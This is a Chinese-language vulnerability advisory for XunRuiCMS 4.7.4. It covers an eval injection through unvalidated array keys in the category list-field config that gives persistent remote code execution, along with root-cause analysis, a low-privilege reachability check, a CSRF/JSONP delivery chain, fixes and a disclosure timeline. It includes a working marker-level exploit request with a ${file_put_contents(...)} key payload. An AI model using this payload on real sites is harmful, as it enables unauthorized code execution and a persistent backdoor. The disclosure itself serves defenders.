# XunRuiCMS 4.7.4 — 栏目列表字段配置 eval 注入导致持久化远程代码执行

**English** | [简体中文](README.zh-CN.md)

- **产品**：迅睿CMS（XunRuiCMS）— 厂商：dayrui / 四川迅睿云软件开发有限公司 — https://www.xunruicms.com
- **影响版本**：4.7.4（官方最新发行版，`Version.php` updatetime 2026-10-23）。更早版本大概率受影响，但未逐一验证。
- **漏洞类型**：CWE-94 代码注入（eval 注入）；写接口缺失 CSRF 防护（CWE-352）加重
- **CVSS 3.1**：8.8（AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H）
- **发现者**：riyuedeqi
- **状态**：CVE 已通过 VulDB 申请中。已通过 CNVD（国家信息安全漏洞共享平台）提交协同报告（2026-10-27）。厂商公告页已核查（45 条历史条目）——无同类条目。
- **测试声明**：以下所有 PoC 均为标记级（仅写入标记文件/回显 md5 标记），不含 webshell、无武器化内容。全部测试在官方发行包的本地部署实例上完成，测试产物事后已清除还原。

## 漏洞概述

后台"共享栏目 → 列表字段配置"功能（`admin.php?c=category&m=config_add`）在保存时**不校验攻击者可控的数组键名**，并将其原样持久化到一个会被 require 的 PHP 配置文件中；此后每次渲染栏目列表页时，这些键名会被拼接进双引号 `eval` 字符串执行。以 `${` 开头的键名会在双引号 eval 上下文中执行任意 PHP 表达式。注入的键名在重启与刷新缓存后依然存在，构成持久化后门特征。

## 成因（4.7.4 官方发行包）

1. **入口不校验键名** — `dayrui/App/Cms/Extends/Admin/Category.php:390-392`（`config_add`）：POST `data` 数组整体通过 `post('data')` 接收；`list_field` 的第一维键名（本意应为 `title`、`thumb` 这类字段名）从未做白名单校验。

2. **键名零清洗落盘** — `dayrui/Fcms/Library/Config.php:78-93`（`to_require`）：`var_export($data, TRUE)` 的产物被写入 `cache/config/category.php`；键名与键值均原样进入生成的 PHP 文件。对比同文件的 `to_require_array()`（102-119 行）对键名调用 `_safe_replace()` ——此处为明确的过滤遗漏。框架的 `xss_clean` 只清洗数组值，从不清洗键名。

3. **键名拼入模板字符串** — `Category.php:188-195`：每个启用的自定义列都会执行 `$list .= '<td ...>$' . $i . '_html</td>'`，键名 `$i` 被原样嵌入 `$list` 模板。

4. **双引号 eval** — `Category.php:346-348`，每次渲染、每条栏目行都会执行：

   ```php
   extract($t);
   $list = str_replace('"', '\'', $list);
   eval("\$nstr = \"$list\";");
   ```

   模板硬编码的 `$` 前缀，加上以 `${` 开头的键名，在双引号字符串内恰好构成 PHP 复杂插值语法 `${ expr }`：花括号内的表达式被求值。`str_replace` 的引号替换防不住——payload 根本不需要"逃逸出字符串"。

## 可达性——不限于超级管理员

权限判定 `_is_admin_auth()`（`dayrui/Fcms/Model/Auth.php:744-756`）将方法名 `config_add` 按下划线解析为动作 `add`，并检查角色授权 URI 列表中是否存在 `category/add`。授予标准的「共享栏目」菜单权限（`role&m=auth_edit` 提交 `data[auth][category/index][]=add/edit/del`）后，权限缓存恰好展开出该 URI。已动态验证：

- **对照组**：零权限后台账号在 `config_add` 处被正确拦截（"没有【增】权限"）；
- **实验组**：仅授予栏目管理权限的角色账号可完整走通注入链（标记文件落盘且可经 Web 读取）。

即：任何持有常见"栏目管理"授权的低权限后台账号（内容编辑、栏目管理员等岗位）均可提权至 Web 进程用户（www-data）的任意代码执行。

此外，该写接口**不校验任何 CSRF token**（安装器默认 `SYS_CSRF='0'`，`Install.php:500`；框架仅在 `'2'` 档才对后台应用 CSRF 过滤器 —— `Filters.php`）。会话 Cookie 为 `SameSite=Lax`，使经典跨站 POST 在现代浏览器上不可靠，因此实际主向量为低权限后台账号直连；另存在一条未认证投递链：`index.php?s=api&c=pay` / `c=buy` 可直达 `dr_exit_msg` 的 JSONP 分支并原样回显 `$_GET['callback']`（无需任何特殊请求头），可将上述 POST 交由"被诱导的已登录管理员"的同源上下文自动完成。

## PoC（标记级）

**第一步 —— 写入 payload 键名**（栏目管理员会话；无需 CSRF token）：

```
POST /admin.php?c=category&m=config_add
Cookie: <后台会话>
Content-Type: application/x-www-form-urlencoded

data[list_field][${file_put_contents("v1_ok.txt","V1_RCE_OK_".md5("v1"))}][use]=1
&data[list_field][${file_put_contents("v1_ok.txt","V1_RCE_OK_".md5("v1"))}][name]=V1
```

响应：`{"code":1,"msg":"ok"}`。键名被原样写入 `cache/config/category.php`：

```
'list_field' => array (
  '${file_put_contents("v1_ok.txt","V1_RCE_OK_".md5("v1"))}' => array ( 'use' => '1', 'name' => 'V1', ),
),
```

（CMS 输入过滤器会在持久化键名的逗号后插入空格——见 `evidence/config-category-after.txt`。表达式仍然执行；空格是合法 PHP。）

**第二步 —— 触发**（任意一次栏目列表页渲染都会执行注入的表达式）：

```
GET /admin.php?c=category&m=index
```

服务器侧结果：站点根目录出现 `/v1_ok.txt`，内容为
`V1_RCE_OK_6654c734ccab8f440ff0825eb443dc7f`（= `md5("v1")`，已独立复算验证），并可通过 `GET /v1_ok.txt`（HTTP 200）读取，确认代码在 Web 进程上下文执行。

## PoC 脚本

`poc/xunruicms_category_eval_rce.py` —— 仅依赖 Python 标准库，端到端复现完整链路（登录 → config_add 注入 → 触发 → HTTP 验证标记），输出 JSON transcript。密码按后台前端行为以 md5 形态提交；目标非回环地址时脚本要求显式传入 `--i-am-authorized`。

```
python3 poc/xunruicms_category_eval_rce.py http://127.0.0.1:8080 \
    --username admin --password '后台密码'
# -> {"rce_verified": true, ...}
```

请仅在一次性授权实验室实例上运行：`config_add` 会覆盖模块栏目配置；运行后删除 `cache/config/category.php` 与标记文件即可还原。

## Evidence（证据）

抓取自全新安装的官方 4.7.4（loopback 会话，仅含 `127.0.0.1`，无需打码）：

- `evidence/repro-1.txt` —— 四步链路的 JSON transcript（登录、config_add、触发、标记验证），以 `rce_verified: true` 结束；
- `evidence/config-category-after.txt` —— 持久化后的 `cache/config/category.php`，注入键名原样可见（注意输入过滤器插入的逗号后空格——仍是合法 PHP，且已实际执行）。

## 危害

1. 任何持有标准"栏目管理"授权的后台账号可注入持久化 eval 表达式 → 获得 www-data 权限的任意代码执行：`config/database.php` 中的数据库凭据可读、Web 可写路径内任意文件读写、全站控制（水平越权提权）；
2. 注入的键名持久化——每次栏目列表渲染均执行，重启与刷新缓存不清除（后门特征）；
3. 结合缺失的 CSRF 防护与未认证 callback 回显入口，未认证外部攻击者可构造投递链："受害管理员点击链接 → 同源自动 POST → 管理员下次访问栏目页即 RCE"。

## 修复建议

1. **键名白名单**：`config_add` 中对 `list_field` 第一维键名强制校验 `^[a-z0-9_]+$`；
2. **落盘过滤**：`Config::to_require` 对键名应用 `_safe_replace()`（与 `to_require_array` 一致）；
3. **消除 eval**：栏目列表渲染改用预注册变量映射表，弃用双引号字符串 `eval`；
4. **CSRF 默认值**：安装器默认 `SYS_CSRF` 由 `'0'` 改为 `'2'`（注意：`'1'` 档框架对后台豁免，**不能**保护后台）；
5. 对 `dr_exit_msg` / `dr_show_error` 的 `callback` 参数增加 `^[A-Za-z0-9_.]+$` 白名单。

## 披露时间线

- **2026-10-27** — 在官方最新发行版 4.7.4 上端到端确认漏洞（含低权限验证与对照实验）；
- **2026-10-27** — 通过 CNVD（国家 CERT 协调平台）提交协同报告；
- **2026-10-27** — GitHub 公开发布本公告；同时提交 VulDB 申请 CVE 编号。

*厂商已通过 CNVD 协调流程获得通报。CVE 编号分配后将更新本公告。*

## 仓库结构

```
├── README.md                          英文公告
├── README.zh-CN.md                    本文件（中文公告）
├── LICENSE                            MIT
├── poc/
│   └── xunruicms_category_eval_rce.py 端到端标记级 PoC（仅标准库）
└── evidence/
    ├── repro-1.txt                    完整链路 JSON transcript（rce_verified: true）
    └── config-category-after.txt      持久化配置文件中的注入键名
```
